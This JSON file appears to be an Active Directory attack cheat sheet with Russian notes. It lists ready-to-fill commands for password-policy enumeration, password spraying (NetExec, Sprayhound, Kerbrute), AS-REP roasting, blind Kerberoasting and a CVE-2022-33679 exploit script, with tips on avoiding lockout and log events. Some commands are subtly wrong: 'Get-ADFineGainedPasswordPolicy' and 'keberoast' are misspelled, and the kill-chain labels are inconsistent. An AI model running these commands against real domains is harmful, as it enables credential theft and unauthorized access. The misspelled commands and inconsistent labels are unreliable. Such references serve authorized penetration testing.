[
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Get Default Policy)",
    "tool": "NetExec (nxc)",
    "req": "DC_IP, User, Password",
    "command": "nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol",
    "profit": "Domain Password Policy",
    "critical_note": "Критический первый шаг. Необходимо узнать политику блокировки (lockout threshold) перед запуском перебора, чтобы избежать DoS атаки на учетные записи.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Get Default Policy)",
    "tool": "PowerShell AD Module",
    "req": "Powershell AD Module",
    "command": "Get-ADDefaultDomainPasswordPolicy",
    "profit": "Domain Password Policy",
    "critical_note": "Требует наличия установленного модуля RSAT Active Directory и прав пользователя домена (или запущенной сессии на машине в домене).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Get Default Policy)",
    "tool": "ldeep",
    "req": "DC_IP, Domain, User, Password",
    "command": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy",
    "profit": "Domain Password Policy",
    "critical_note": "Инструмент для перечисления LDAP. Полезен, если SMB закрыт или фильтруется.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Fine Grained Policy)",
    "tool": "Impacket (ldapsearch-ad.py)",
    "req": "DC, Domain, User, Password",
    "command": "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols",
    "profit": "Fine Grained Password Policy",
    "critical_note": "Используется для получения PSO (Password Settings Objects), которые могут иметь отличные от дефолтных политики блокировки для привилегированных групп.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Fine Grained Policy)",
    "tool": "PowerShell AD Module",
    "req": "Powershell AD Module",
    "command": "Get-ADFineGainedPasswordPolicy -filter *",
    "profit": "Fine Grained Password Policy",
    "critical_note": "Позволяет выявить ослабленные политики паролей для сервисных аккаунтов или более строгие для администраторов.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Fine Grained Policy)",
    "tool": "ldeep",
    "req": "DC_IP, Domain, User, Password",
    "command": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso",
    "profit": "Fine Grained Password Policy",
    "critical_note": "Можно запускать с правами обычного пользователя, но объем доступной информации может быть ограничен (как указано на схеме).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (User == Password)",
    "tool": "NetExec (nxc)",
    "req": "DC_IP, Users List, Passwords List",
    "command": "nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success",
    "profit": "Clear text Credentials",
    "critical_note": "Флаг --no-bruteforce обязателен для проверки конкретных пар логин:пароль, чтобы избежать блокировки учетных записей при множественных попытках.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (User == Password)",
    "tool": "Sprayhound",
    "req": "DC_IP, Domain, Users List",
    "command": "sprayhound -U <users.txt> -d <domain> -dc <dc_ip>",
    "profit": "Clear text Credentials",
    "critical_note": "Автоматизирует процесс. Для проверки user=pass не добавляйте дополнительные флаги (нижний/верхний регистр), как указано в примечании на схеме.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Usual Passwords)",
    "tool": "NetExec (nxc)",
    "req": "DC_IP, Users List, Password",
    "command": "nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success",
    "profit": "Clear text Credentials",
    "critical_note": "Используется для проверки популярных сезонных паролей (например, SeasonYear!, Company123). Высокий риск обнаружения.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Usual Passwords)",
    "tool": "Sprayhound",
    "req": "DC_IP, Domain, Users List, Password",
    "command": "sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>",
    "profit": "Clear text Credentials",
    "critical_note": "Интегрирует сбор данных из BloodHound для более целевого распыления паролей, если настроен.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Password Spray (Usual Passwords)",
    "tool": "Kerbrute",
    "req": "Domain, Users List, Password",
    "command": "kerbrute passwordspray -d <domain> <users.txt> <password>",
    "profit": "Clear text Credentials",
    "critical_note": "Работает через протокол Kerberos (Pre-Auth), что быстрее SMB и не создает событий в логах Windows Security ID 4625 (Logon Failure), но генерирует событие 4771.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "List ASREProastable Users",
    "tool": "Cypher (BloodHound/Neo4j)",
    "req": "Neo4j/BloodHound Access",
    "command": "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u",
    "profit": "List of Vulnerable Users",
    "critical_note": "Требует предварительно собранных данных в BloodHound. Позволяет найти цели без прямого взаимодействия с контроллером домена на этапе анализа.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "ASREP Roasting",
    "tool": "Impacket (GetNPUsers.py)",
    "req": "Domain, Users List",
    "command": "GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>",
    "profit": "Hash found ASREP",
    "critical_note": "Атака возможна только на пользователей с атрибутом 'Do not require Kerberos preauthentication'. Не требует пароля цели, только список пользователей.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "ASREP Roasting",
    "tool": "NetExec (nxc)",
    "req": "DC_IP, Users List",
    "command": "nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>",
    "profit": "Hash found ASREP",
    "critical_note": "Автоматизированный способ через LDAP. В поле пароля передается пустая строка, так как для запроса TGT без пре-аутентификации пароль не нужен.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "ASREP Roasting",
    "tool": "Rubeus",
    "req": "Rubeus Executable",
    "command": "Rubeus.exe asreproast /format:hashcat",
    "profit": "Hash found ASREP",
    "critical_note": "Выполняется из-под Windows. Требует компиляции или доставки бинарного файла на целевую машину. Может быть обнаружен антивирусом.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Blind Kerberoasting",
    "tool": "Rubeus",
    "req": "Domain, DC_IP, ASREP User, Users List (SPNs)",
    "command": "Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>",
    "profit": "Hash found TGS",
    "critical_note": "Техника использования скомпрометированного пользователя ASREP (без пре-аутентификации) для запроса билетов TGS других пользователей (Kerberoasting) без знания пароля первого.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "Blind Kerberoasting",
    "tool": "Impacket (GetUserSPNs.py)",
    "req": "Domain, DC_IP, ASREP User, Users List",
    "command": "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>\"/",
    "profit": "Hash found TGS",
    "critical_note": "Позволяет выполнить Kerberoasting, используя учетную запись, уязвимую к ASREPRoast, в качестве точки входа.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid user (no password)",
    "attack_type": "CVE-2022-33679",
    "tool": "Exploit Script (Python)",
    "req": "Domain, User, Target",
    "command": "CVE-2022-33679.py <domain>/<user> <target>",
    "profit": "Lat move PTT",
    "critical_note": "Уязвимость Kerberos, позволяющая понизить шифрование до RC4-MD4 при запросе билета. Требует специфических условий и часто пропатчена.",
    "kill_chain_phase": "RECON"
  }
]